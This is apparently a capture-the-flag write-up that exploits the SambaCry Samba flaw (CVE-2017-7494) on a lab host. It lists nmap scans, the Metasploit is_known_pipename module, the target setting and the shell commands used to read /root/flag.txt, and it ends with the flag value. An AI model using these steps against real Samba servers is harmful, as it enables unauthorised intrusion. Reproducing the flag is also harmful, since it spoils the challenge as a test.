# Vulnerability Exploitation Report: CVE-2017-7494

## Vulnerability Overview
**CVE ID**: CVE-2017-7494  
**CVSS Score**: 10.0 (Critical)  
**Description**: The SambaCry vulnerability (CVE-2017-7494) affects Samba versions 3.5.0 to 4.6.4, allowing unauthenticated remote code execution (RCE) via a maliciously crafted named pipe request. This critical flaw, exploitable through writable Samba shares, enables attackers to execute arbitrary code on the target server.

## Objective
Exploit the CVE-2017-7494 vulnerability on a target Samba server to gain unauthorized access and retrieve the `/root/flag.txt` file as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.9
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the contents of `/root/flag.txt`

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.9) to confirm the presence of Samba.

```
nmap -sV 192.168.5.9
```

### Step 3: Launch Metasploit
Start the Metasploit Framework to access exploit modules.

```
msfconsole
```

### Step 4: Search for Samba Exploit
Search Metasploit for modules related to Samba vulnerabilities.

```
search samba
```

### Step 5: Select SambaCry Exploit Module
Choose the Metasploit module for the SambaCry (is_known_pipename) RCE vulnerability.

```
use exploit/linux/samba/is_known_pipename
```

### Step 6: Review Module Details
Display information about the selected module to understand its options and requirements.

```
info
```

### Step 7: Configure the Target Host
Set the target host to the Samba serverâ€™s IP address.

```
set RHOSTS 192.168.5.9
```

### Step 8: Execute the Exploit
Run the exploit to achieve remote code execution on the target system.

```
exploit
```

### Step 9: Navigate to Root Directory
Navigate to the `/root` directory to locate the flag file.

```
cd /root
```

### Step 10: List Directory Contents
List the contents of the `/root` directory to identify the flag file.

```
ls
```

### Step 11: Retrieve the Flag
Read the contents of the `flag.txt` file.

```
cat flag.txt
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.

**Flag**: ncIOq5Esowk6RMXJ